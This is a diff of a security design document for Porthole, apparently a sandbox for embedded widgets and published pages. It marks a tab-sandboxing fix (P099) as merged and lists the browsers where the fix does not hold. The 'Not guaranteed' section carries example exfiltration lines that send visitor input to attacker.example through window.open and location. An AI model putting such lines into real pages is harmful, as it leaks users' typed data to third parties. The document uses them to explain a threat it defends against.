@@ -121,7 +121,7 @@ Porthole does not protect against these.
 | [S1](#s1-inline-widgets-in-a-conversation) | Inline widgets in a conversation | `inlineWidget`, opaque | (a) | every page sends `embedderCsp` |
 | [S2](#s2-live-widgets-content-that-reads-the-hosts-data) | Live widgets that read the host's data | `liveWidget` | (a), (e) | as S1, and the page follows S7 |
 | [S3](#s3-private-artifacts) | Private artifacts | `artifact`, domain | (a), (c) | the content domain is the host's alone, the secret is random, `authorize` revokes |
-| [S4](#s4-public-links-and-pages-that-are-apps) | Public links, and pages that are apps | `artifact`, domain, public grants; `runtime` | (a), (c) | P099 has merged, and the host handles abuse |
+| [S4](#s4-public-links-and-pages-that-are-apps) | Public links, and pages that are apps | `artifact`, domain, public grants; `runtime` | (a), (c) | the host handles abuse |
 | [S5](#s5-third-party-mcp-apps) | Third-party MCP Apps | `mcpApp` | (b) | the host shows a view's domains and its model context |
 | [S6](#s6-previews-of-a-running-app) | Previews of a running app | `url` | (d), (c) | the code is the host's own |
 | [S7](#s7-several-displays-on-one-page) | Several displays on one page | any | (e) | the page follows the composition rule |
@@ -339,6 +339,21 @@ the attacker (c), and its readers are strangers.
   so it is never punycode for another name; pages say `noindex`; a file of a type Porthole
   doesn't know is served as a download.
 - `authorize` is the host's takedown switch.
+- A page opened in a tab of its own has its frame's powers and no more (P099): its CSP header
+  carries the frame's sandbox (scripts on its own origin; no popups, forms, downloads, browser
+  dialogs, or navigation of another window, its opener's included), and its `Permissions-Policy`
+  header denies what the frame's `allow` doesn't grant (camera, microphone, location, full
+  screen, passkeys, payments, sharing, the built-in AI models, and every other feature a frame
+  lacks by default). The shell adds its own walls there, the only ones on engines that don't apply
+  that header (WebKit, Firefox): `window.open` answers null; picture-in-picture windows, devices,
+  location, full screen, passkeys, the share sheet and payments (Apple Pay too) are refused at
+  once; and its navigation guard stops the page navigating itself away, by `location` (set,
+  `assign`, `replace`), a link, `navigation.navigate()` or `open(…, "_self")`. The last three ask
+  the guard's rule before they start (WebKit sends a link's and `navigate()`'s request otherwise),
+  read the address once, and read it through the platform's own functions, so a page can't
+  hand them one address to check and another to go to; a link, in a shadow root too, is followed
+  by the shell as it was when clicked, never by the browser as a later listener left it. `defineHostConformance`'s `served.domain.tab-*` cases check it through
+  the host's real edge.
 
 **The host must**
 
@@ -355,13 +370,19 @@ the attacker (c), and its readers are strangers.
   `X-Forwarded-For`; only where the app is reachable through those proxies alone) or
   `rateLimit.key`.
 - Check pages for secrets before publishing them: `lintContent` has no rule for credentials.
+- Pass Porthole's `Content-Security-Policy` and `Permissions-Policy` headers on as they are,
+  through any edge or proxy: on a tab they are the page's sandbox.
 
 **Not guaranteed**
 
-- A page opened in a tab has no sandbox. The shell guards its navigation and `document.write`,
-  but a click can run `window.open("https://attacker.example/?" + whatTheVisitorTyped)`, past
-  `connect-src` and `form-action` (open until P099). In a frame the sandbox has no
-  `allow-popups`, so this is about tabs, which is how public links are usually opened.
+- In a browser without the Navigation API (older Safari and Firefox releases), a page opened in
+  a tab can navigate itself away with data in the address (`location = "https://attacker.example/?"
+  + whatTheVisitorTyped`): the shell's guard gets no events there, and a tab has no embedding page
+  whose `frame-src` would stop it. It can also go to a `blob:` document it wrote itself, where
+  the shell never runs: the CSP and its sandbox carry over, the `Permissions-Policy` header and
+  the shell's walls don't (WebRTC is there, and a granted location). No CSP directive closes
+  either (P099, accepted). A host that must cover such browsers shows public pages in its own
+  frame.
 - `db` and `user` reach the author without any network: what viewers write, and `user.get()`'s
   `{ id, name, level }`, the page can read and keep in `db`. Closed egress doesn't cover a channel
   the host itself provides. Give `id` a per-artifact pseudonym (`pseudonymFor`), and decide what
@@ -566,7 +587,7 @@ its row names exists today, and the sections it cites say "open until" that deci
 | P096 | Planned | The negative-control runner counts a control that didn't run as passed, and CI runs the runtime's controls only. | §4 |
 | P097 | Merged | A release waits for the same commit's CI. No guarantee here depends on it. | |
 | P098 | Planned | The leak suite's unstable cases. No guarantee here depends on it, but a red run hides a real regression. | |
-| P099 | Planned | A served page in a tab has no sandbox: `window.open` sends input out. | S4 |
+| P099 | Merged | A served page in a tab had no sandbox: `window.open` sent input out, it could navigate its opener, open a picture-in-picture window, and ask for the camera, location or full screen. Now its headers carry its frame's sandbox and deny what its frame's `allow` doesn't grant, and the shell closes those on a tab too; the served suite probes self-navigation in frames and tabs. A browser without the Navigation API is an accepted limit. | S4 |
 | P100 | Planned | `setModelContext` is rate-limited only, unseen by the person. | S1, S5 |
 | P101 | Merged | Under https Porthole read unprefixed `porthole-*` cookies a sibling label can plant; the entered mark carried no label; url mode checked neither `Origin` nor `Sec-Fetch-Site`. Now only `__Host-` names are read, the mark names its label, and a url-mode app answers its own origin and navigations. | S3, S6 |
 | P102 | | This document. | |
